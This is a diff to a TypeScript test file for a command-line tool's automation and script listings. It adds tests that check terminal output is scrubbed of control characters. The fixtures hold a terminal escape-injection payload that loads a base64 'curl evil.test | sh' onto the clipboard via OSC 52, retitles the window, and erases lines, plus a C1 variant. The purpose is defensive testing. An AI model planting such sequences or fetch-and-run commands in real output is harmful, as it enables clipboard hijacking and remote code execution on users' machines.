@@ -137,7 +137,20 @@ const browserOnly = (reads?: string) => ({
   refusal: { code: 'NEEDS_BROWSER_SESSION', fix: reads === undefined ? 'Open this from the app; a token cannot change what this record is.' : `Open this from the app; a token cannot ${reads}.`, at: 'principal' },
 });
 
-async function stub(t: { after: (fn: () => void | Promise<void>) => void }, opts: { admin?: boolean; rows?: unknown[]; scripts?: unknown[] } = {}) {
+/* AUDIT THIRTY-SEVEN, FINDING 3, BYTE FOR BYTE: what a member at `append` wrote into a row, and what a `set_var` step
+   filled from it. OSC 52 asks a terminal to put `curl evil.test | sh` on the clipboard, OSC 0 retitles the window, and
+   the CR and CSI 2K erase the line it arrived on. `automations show` handed every byte of it to the owner's terminal. */
+const HOSTILE = 'Invoice 7\u001b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\u0007\u001b]0;BrainDog: all clear\u0007\r\u001b[2K';
+/* The same words as a terminal is allowed to see them: every control a run of one space, and nothing else touched. */
+const HOSTILE_SHOWN = 'Invoice 7 ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== ]0;BrainDog: all clear [2K';
+/* THE EIGHT-BIT CSI, U+009B: the same erase-line under a second spelling, for a terminal that honours it, and one the
+   copies in `brief.ts` and `session.ts` let through because they stopped at U+001F. */
+const C1 = 'acme\u009b2K';
+
+/** Every control character a printed line could carry, C0, DEL and C1 alike. */
+const CONTROL = /[\u0000-\u001f\u007f-\u009f]/;
+
+async function stub(t: { after: (fn: () => void | Promise<void>) => void }, opts: { admin?: boolean; rows?: unknown[]; scripts?: unknown[]; chase?: unknown; fix?: unknown } = {}) {
   const seen: Seen[] = [];
   const server: Server = createServer((req, res) => {
     const chunks: Buffer[] = [];
@@ -156,8 +169,8 @@ async function stub(t: { after: (fn: () => void | Promise<void>) => void }, opts
       if (method === 'context') return answer({ ok: true, value: CONTEXT });
       if (method === 'automations') {
         if (args.rule === undefined) return answer({ ok: true, value: opts.rows ?? ROWS });
-        if (args.rule === 'chase' || args.rule === 'rule.chase') return answer({ ok: true, value: CHASE });
-        return answer({ ok: false, refusal: { code: 'DECLARATION_UNKNOWN', fix: `There is no automation called rule.${String(args.rule)}.`, at: 'rule' } });
+        if (args.rule === 'chase' || args.rule === 'rule.chase') return answer({ ok: true, value: opts.chase ?? CHASE });
+        return answer({ ok: false, refusal: { code: 'DECLARATION_UNKNOWN', fix: opts.fix ?? `There is no automation called rule.${String(args.rule)}.`, at: 'rule' } });
       }
       if (method === 'automationRun') return answer(admin ? { ok: true, value: { run: 'run_01JANEWNEWNEWNEWNEWNEWNEWN' } } : browserOnly('start an automation'));
       if (method === 'cancelRun') return answer(admin ? { ok: true, value: { run: args.run, state: 'cancelled' } } : browserOnly('stop a run'));
@@ -171,7 +184,7 @@ async function stub(t: { after: (fn: () => void | Promise<void>) => void }, opts
   return { base: `http://127.0.0.1:${String((server.address() as AddressInfo).port)}`, seen };
 }
 
-async function setup(t: { after: (fn: () => void | Promise<void>) => void }, opts: { admin?: boolean; rows?: unknown[]; scripts?: unknown[] } = {}) {
+async function setup(t: { after: (fn: () => void | Promise<void>) => void }, opts: { admin?: boolean; rows?: unknown[]; scripts?: unknown[]; chase?: unknown; fix?: unknown } = {}) {
   const h = await stub(t, opts);
   const dir = mkdtempSync(join(tmpdir(), 'braindog-automations-'));
   t.after(() => rmSync(dir, { recursive: true, force: true }));
@@ -294,6 +307,71 @@ test('scripts list: none is one sentence, and a verb it does not know is refused
   assert.equal(h.seen.length, seen, 'a bad flag or verb sends nothing');
 });
 
+/** CHASE with every string a member or a pack could have supplied carrying the audit's bytes. */
+const HOSTILE_CHASE = {
+  ...CHASE,
+  name: HOSTILE,
+  register: HOSTILE,
+  pack: HOSTILE,
+  project: C1,
+  next: HOSTILE,
+  runs: [{ ...CHASE.runs[0], actor: HOSTILE, say: HOSTILE, steps: [{ n: 1, kind: 'set_var', state: 'done', answer: HOSTILE, at: '2026-09-21T14:02:11.000Z' }] }],
+};
+
+const controlled = (lines: string[]) => lines.filter((l) => CONTROL.test(l)).map((l) => JSON.stringify(l));
+
+test('automations show: a step answer, a name and a note a member wrote reach the terminal with no control character in them', async (t) => {
+  const h = await setup(t, { chase: HOSTILE_CHASE });
+  assert.equal(await automations(['show', 'chase'], h.io), 0);
+  assert.deepEqual(controlled(h.out), [], 'a printed line carries a control character');
+  /* THE WORDS STAY, READABLE AS WHAT THEY ARE: an owner debugging the run should see that somebody wrote an escape
+     sequence into the row, not a blank where it was. */
+  assert.equal(h.out.at(-1), `    1 set_var: done (${HOSTILE_SHOWN})`);
+  assert.ok(h.out.some((l) => l.includes(`by ${HOSTILE_SHOWN} on a write. ${HOSTILE_SHOWN}.`)));
+  assert.ok(h.out.some((l) => l.includes('for acme 2K')));
+  /* --json HANDS AN AGENT THE RECORD'S VALUE UNCHANGED: the scrub is for a terminal, and the bytes are still data. */
+  assert.deepEqual(h.answered, [{ value: HOSTILE_CHASE }]);
+});
+
+test('automations list and scripts list: every name, list, pack, project and last word a line prints is scrubbed', async (t) => {
+  const rows = [{ ...ROWS[0], name: HOSTILE, register: HOSTILE, pack: HOSTILE, project: C1, last: { ...ROWS[0]?.last, state: HOSTILE, say: HOSTILE } }];
+  const scriptRows = [
+    {
+      ...SCRIPTS[0],
+      title: HOSTILE,
+      pack: C1,
+      runs: { every: HOSTILE, door: HOSTILE, rule: true },
+      reads: [HOSTILE],
+      writes: [C1],
+      egress: [HOSTILE],
+      next: HOSTILE,
+      last: { ...SCRIPTS[0]?.last, outcome: HOSTILE, say: HOSTILE },
+    },
+  ];
+  const h = await setup(t, { rows, scripts: scriptRows });
+  assert.equal(await automations(['list'], h.io), 0);
+  assert.equal(await scripts(['list'], h.io), 0);
+  assert.deepEqual(controlled(h.out), [], 'a printed line carries a control character');
+  assert.deepEqual(h.answered, [{ value: rows }, { value: scriptRows }]);
+});
+
+test("automations show: a refusal's sentence is scrubbed for the terminal and kept whole for an agent", async (t) => {
+  const h = await setup(t, { fix: HOSTILE });
+  assert.equal(await automations(['show', 'nowhere'], h.io), 1);
+  assert.deepEqual(h.said, [HOSTILE_SHOWN]);
+  assert.equal(h.answered[0]?.refusal?.fix, HOSTILE);
+});
+
+/* A FIX THAT IS NOT A STRING STILL REFUSES; IT DOES NOT THROW. `@braindog/client` passes any `{ ok: false, refusal }`
+   through without looking inside it, and measured against the first cut of this scrub, a `fix` of 7 threw
+   `said.replace is not a function` out of `show`, so `main.ts` printed that and the refusal's code never reached the
+   `--json` envelope. Before the scrub the same answer exited 1 with its code kept, and it still must. */
+test("automations show: a refusal whose fix is not a string is still a refusal, with its code kept for an agent", async (t) => {
+  const h = await setup(t, { fix: 7 });
+  assert.equal(await automations(['show', 'nowhere'], h.io), 1);
+  assert.equal(h.answered[0]?.refusal?.code, 'DECLARATION_UNKNOWN');
+});
+
 type Ran = { code: number | null; stdout: string; stderr: string };
 
 const ran = (args: string[], env: NodeJS.ProcessEnv, cwd: string): Promise<Ran> =>
@@ -321,4 +399,14 @@ test('braindog scripts resume --json: the ADMIN refusal is the envelope’s code
   assert.equal(out.code, 1);
   assert.deepEqual(JSON.parse(out.stdout), { ok: false, refusals: [browserOnly().refusal] });
   assert.equal(`${out.stdout}${out.stderr}`.includes(TOKEN), false, 'the token reached an output');
+});
+
+test('braindog automations show --json: the escape bytes stay in the value, JSON-escaped, and never raw on stdout', async (t) => {
+  const h = await setup(t, { chase: HOSTILE_CHASE });
+  const out = await ran(['automations', 'show', 'chase', '--json'], { ...process.env, ...h.env }, h.dir);
+  assert.equal(out.code, 0, out.stderr);
+  /* C0 ONLY, BECAUSE THAT IS WHAT JSON.stringify ESCAPES: measured, the U+009B in `project` leaves `main.ts`'s `emit` as
+     the raw bytes C2 9B, since JSON allows it unescaped. The audit's ESC, BEL and CR are all C0 and all escaped. */
+  assert.equal(/[\u0000-\u001f]/.test(out.stdout.trimEnd()), false, `stdout carries a raw control character: ${JSON.stringify(out.stdout)}`);
+  assert.deepEqual(JSON.parse(out.stdout), { ok: true, value: HOSTILE_CHASE });
 });
